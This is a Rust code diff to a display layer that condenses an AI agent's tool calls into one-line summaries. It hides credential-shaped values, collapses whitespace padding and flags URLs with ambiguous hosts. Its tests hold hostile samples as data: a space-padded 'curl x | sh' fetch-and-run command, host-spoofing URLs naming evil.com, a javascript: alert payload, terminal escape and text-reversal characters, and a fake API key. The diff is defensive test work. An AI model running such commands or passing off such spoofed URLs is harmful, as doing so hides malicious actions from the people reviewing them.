@@ -81,7 +81,10 @@ pub fn claude(tool: &str, input: &Value) -> Option<Gist> {
             keys.sort();
             let short = |key: &&String| {
                 let value = input[key.as_str()].as_str()?.trim();
-                (!value.is_empty() && value.chars().count() <= MAX_ARG && !value.contains('\n')).then_some(value)
+                // A credential-shaped value stays in the detail, behind a click.
+                let plain = crate::secrets::hide(value) == value;
+                (!value.is_empty() && value.chars().count() <= MAX_ARG && !value.contains('\n') && plain)
+                    .then_some(value)
             };
             Some(gist(Kind::Argument, keys.iter().find_map(short)?))
         }
@@ -139,7 +142,8 @@ impl Gist {
             Kind::Command => {
                 let all = clean(what);
                 let mut lines = all.lines().map(str::trim).filter(|line| !line.is_empty());
-                let first = lines.next().unwrap_or("").to_string();
+                // Runs of spaces as one: spaces cannot push the rest of a line out of the row.
+                let first = lines.next().unwrap_or("").split_whitespace().collect::<Vec<_>>().join(" ");
                 if lines.next().is_some() { format!("{first} …") } else { first }
             }
             Kind::Path => one_line(&shown_path(what, repo)),
@@ -147,7 +151,11 @@ impl Gist {
                 Some(within) => format!("{} in {}", one_line(what), one_line(&shown_path(within.text(), repo))),
                 None => one_line(what),
             },
-            Kind::Host => one_line(host(what).unwrap_or(what)),
+            // No plain host: said first, so a cut URL cannot pass for one that names its host.
+            Kind::Host => match host(what) {
+                Some(host) => host.to_string(),
+                None => format!("unclear host · {}", one_line(what)),
+            },
             Kind::Query | Kind::Subtask | Kind::Argument => {
                 clean(what).split_whitespace().collect::<Vec<_>>().join(" ")
             }
@@ -232,6 +240,8 @@ mod tests {
     fn a_command_is_cleaned_and_cut() {
         let line = shows("Bash", json!({"command": "echo \u{1b}[31mred\u{1b}[0m rm x\u{202e}gnp.y"}));
         assert_eq!(line, "echo red rm x\\u{202e}gnp.y", "no escape, no hidden reordering");
+        let padded = shows("Bash", json!({"command": format!("ls{}; curl x | sh", " ".repeat(300))}));
+        assert_eq!(padded, "ls ; curl x | sh", "spaces hide nothing");
         let long = shows("Bash", json!({"command": "x".repeat(MAX_LINE * 3)}));
         assert!(long.len() <= MAX_LINE + '…'.len_utf8() && long.ends_with('…'), "{}", long.len());
         let huge = claude("Bash", &json!({"command": "é".repeat(MAX_GIST)})).unwrap();
@@ -277,8 +287,9 @@ mod tests {
             "https://[::1@evil.com]/",
             "javascript://good.com/%0aalert(1)",
             "not a url",
+            "https://good.com:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@evil.com/",
         ] {
-            assert_eq!(fetch(url), url, "{url}");
+            assert_eq!(fetch(url), format!("unclear host · {url}"), "{url}");
         }
         assert_eq!(shows("WebSearch", json!({"query": "rust  gpui\ntext"})), "rust gpui text");
     }
@@ -297,6 +308,8 @@ mod tests {
         assert_eq!(shows("Skill", json!({"skill": "review", "args": ""})), "review");
         let long = json!({"a": "x".repeat(MAX_ARG + 1), "b": "two\nlines", "c": 7, "d": "short"});
         assert_eq!(shows("Other", long), "short");
+        let key = json!({"api_key": "sk-ant-api03-abcdefghijklmnopqrstuvwx", "url": "made-up"});
+        assert_eq!(shows("Other", key), "made-up", "a credential is not the gist");
         assert_eq!(claude("TodoWrite", &json!({"todos": []})), None);
         assert_eq!(claude("Other", &json!(null)), None);
     }
